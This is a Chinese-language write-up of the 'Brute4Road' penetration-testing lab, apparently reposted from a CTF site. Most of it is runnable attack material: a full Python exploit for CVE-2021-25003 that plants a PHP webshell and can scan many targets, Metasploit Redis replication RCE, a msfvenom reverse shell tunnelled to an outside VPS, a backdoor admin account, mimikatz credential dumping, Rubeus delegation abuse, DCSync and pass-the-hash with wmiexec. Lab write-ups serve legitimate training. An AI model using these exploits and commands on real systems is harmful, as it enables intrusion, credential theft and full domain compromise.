# 春秋云镜——Brute4Road Writeup

> 原文: https://www.ctfiot.com/65358.html
> ID: 65358

fscan扫了一下入口点，开放21、22、80、6379

21有个ftp匿名登陆，6379有redis未授权访问

redis写shell的方式都试过了，只剩下主从复制没打

拿GitHub的脚本打了几次没打出来，换成msf通了

use exploit/linux/redis/redis_replication_cmd_execset RHOSTS 47.92.135.138set SRVHOST VPS_IPset LHOST VPS_IPexploit

这里可以使用suid提权

以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。

find / -user root -perm -4000 -print 2>/dev/nullfind / -perm -u=s -type f 2>/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ;

可以看到这里有个base64是具有suid权限的，我们可以通过base64读取本地文件并输出

参考：https://gtfobins.github.io/gtfobins/base64/

base64 "/home/redis/flag/flag01" | base64 --decode

同样还是先在入口点做上代理，顺便扫一下当前网段

proxychains wpscan --url http://172.22.2.18

可以看到存在wpcargo插件，版本为6.x.x，搜索相关漏洞

https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a

有一个未授权RCE，exp如下

# @author : biulove0x# @name : WP Plugins WPCargo Exploiter
## This is a magic string that when treated as pixels and compressed using the png## algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file## payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'## def encode_character_code(c: int):## return '{:08b}'.format(c).replace('0', 'x')## text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]
# References : https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
from urllib3.exceptions import InsecureRequestWarningimport concurrent.futuresimport requests, re, argparse
print('''############################################# @author : biulove0x ## @name : WP Plugins WPCargo Exploiter ## @cve : CVE-2021-25003 #############################################''')
def wpcargo(_target, _timeout=5): _payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx' _endpoint = 'wp-content/plugins/wpcargo/includes/barcode.php?text='+ _payload +'&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php' _sessionget = requests.Session() _headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36' } def save_result(_result): _saved = open('RESULT-WPCRGO.txt', 'a+') _saved.write(_result + 'n')
 try: _sessionget.get(url=_target + _endpoint, headers=_headers, allow_redirects=True, timeout=_timeout) _validationshell = _sessionget.post(url=_target + 'wp-content/wp-conf.php?1=system', headers=_headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=_timeout)
 if 'root:x:0:0:root' in _validationshell.text: print('[-] ' + _target + 'wp-content/wp-conf.php => Uploaded!') save_result(_target + 'wp-content/wp-conf.php?1=system') else: print('[+] ' + _target + ' Not found!') except: print('[%] ' + _target + ' Requests failed')
def main(_choose, _target): if _choose == 1: wpcargo(_target)
 elif _choose == 2: with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor: _ur_list = open(_target, 'r').read().split() _futures = []
 for _url in _ur_list: _futures.append(executor.submit(wpcargo, _target=_url))
 for _future in concurrent.futures.as_completed(_futures): if(_future.result() is not None): print(_future.result()) else: exit()
## SSL Bypassrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)
## Setup args_parser = argparse.ArgumentParser(description='CVE-2021-25003 [ WPCargo < 6.9.0 - Unauthenticated RCE ]')_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')_args = _parser.parse_args()
## Variable args_singleTarget = _args.t_multiTarget = _args.l
if __name__ == '__main__': if not _singleTarget == None: _choose = 1 main(_choose, _singleTarget) elif not _multiTarget == None: _choose = 2 main(_choose, _multiTarget) else: print('WpCargo.py --help for using tools')

http://172.22.2.18/wp-content/wp-conf.php?1=system
POST:2=whoami

当前用户为www-data

翻了一下wp-config.php，里面有数据库账号密码

连接上去后发现第二个flag

同时里面存放有一张密码表

用刚才数据库里拿到的密码表爆破MsSQL，得到密码为ElGNkOiC

使用Multiple.Database.Utilization.Tools工具连接

可以使用xpcmdshell执行命令，但是只有低权限

先激活Ole Automation Procedures组件，再上传SweetPotato.exe提权，得到system权限

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=1080 -f exe > exp.exe

msf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set LHOST VPS_IPmsf6 exploit(multi/handler) > set LPORT 4444

将tcptunnel上传至入口点机器，参考https://cloud.tencent.com/developer/article/1974148

开启端口转发，将1080端口接收到的msf reverse shell转发至VPS的4444端口

./tcptunnel --local-port=1080 --remote-port=4444 --remote-host=123.56.220.163 --fork --buffer-size=8192 --stay-alive

将第一步生成的payload上传至MsSQLSERVER后运行，VPS接收到shell

可以看到3389是开启的，也可以直接添加后门账户正向连接进去

net user dawn P@ssw0rd /addnet localgroup administrators dawn /add

由于已经获取了MSSQLSERVER的system权限，我们可以用mimikatz导出哈希

meterpreter > load kiwimeterpreter > creds_all

获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352

MSSQLSERVER机器配置了到 DC LDAP 和 CIFS 服务的约束性委派

首先通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据

Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap

然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中

中间因为换了环境，TGT发生了变化，以实际命令为准

LDAP服务具有DCSync权限，可以导出域内用户哈希

mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit

得到域管的哈希后我们可以通过WMI服务登录域控

python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3


```
use exploit/linux/redis/redis_replication_cmd_execset RHOSTS 47.92.135.138set SRVHOST VPS_IPset LHOST VPS_IPexploit
```



```
find / -user root -perm -4000 -print 2>/dev/nullfind / -perm -u=s -type f 2>/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ;
```



```
base64 "/home/redis/flag/flag01" | base64 --decode
```



```
proxychains wpscan --url http://172.22.2.18
```



```
# @author : biulove0x# @name : WP Plugins WPCargo Exploiter
## This is a magic string that when treated as pixels and compressed using the png## algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file## payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'## def encode_character_code(c: int):## return '{:08b}'.format(c).replace('0', 'x')## text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]
# References : https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
from urllib3.exceptions import InsecureRequestWarningimport concurrent.futuresimport requests, re, argparse
print('''############################################# @author : biulove0x ## @name : WP Plugins WPCargo Exploiter ## @cve : CVE-2021-25003 #############################################''')
def wpcargo(_target, _timeout=5): _payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx' _endpoint = 'wp-content/plugins/wpcargo/includes/barcode.php?text='+ _payload +'&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php' _sessionget = requests.Session() _headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36' } def save_result(_result): _saved = open('RESULT-WPCRGO.txt', 'a+') _saved.write(_result + 'n')
 try: _sessionget.get(url=_target + _endpoint, headers=_headers, allow_redirects=True, timeout=_timeout) _validationshell = _sessionget.post(url=_target + 'wp-content/wp-conf.php?1=system', headers=_headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=_timeout)
 if 'root:x:0:0:root' in _validationshell.text: print('[-] ' + _target + 'wp-content/wp-conf.php => Uploaded!') save_result(_target + 'wp-content/wp-conf.php?1=system') else: print('[+] ' + _target + ' Not found!') except: print('[%] ' + _target + ' Requests failed')
def main(_choose, _target): if _choose == 1: wpcargo(_target)
 elif _choose == 2: with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor: _ur_list = open(_target, 'r').read().split() _futures = []
 for _url in _ur_list: _futures.append(executor.submit(wpcargo, _target=_url))
 for _future in concurrent.futures.as_completed(_futures): if(_future.result() is not None): print(_future.result()) else: exit()
## SSL Bypassrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)
## Setup args_parser = argparse.ArgumentParser(description='CVE-2021-25003 [ WPCargo < 6.9.0 - Unauthenticated RCE ]')_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')_args = _parser.parse_args()
## Variable args_singleTarget = _args.t_multiTarget = _args.l
if __name__ == '__main__': if not _singleTarget == None: _choose = 1 main(_choose, _singleTarget) elif not _multiTarget == None: _choose = 2 main(_choose, _multiTarget) else: print('WpCargo.py --help for using tools')
```



```
http://172.22.2.18/wp-content/wp-conf.php?1=system
POST:2=whoami
```



```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=1080 -f exe > exp.exe
```



```
msf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set LHOST VPS_IPmsf6 exploit(multi/handler) > set LPORT 4444
```



```
./tcptunnel --local-port=1080 --remote-port=4444 --remote-host=123.56.220.163 --fork --buffer-size=8192 --stay-alive
```



```
net user dawn P@ssw0rd /addnet localgroup administrators dawn /add
```



```
meterpreter > load kiwimeterpreter > creds_all
```



```
Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
```



```
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
```



```
python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666536380.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1666536381.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666536382.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666536383.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666536383.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1666536385.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666536388.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666536391.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666536392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1666536393.png)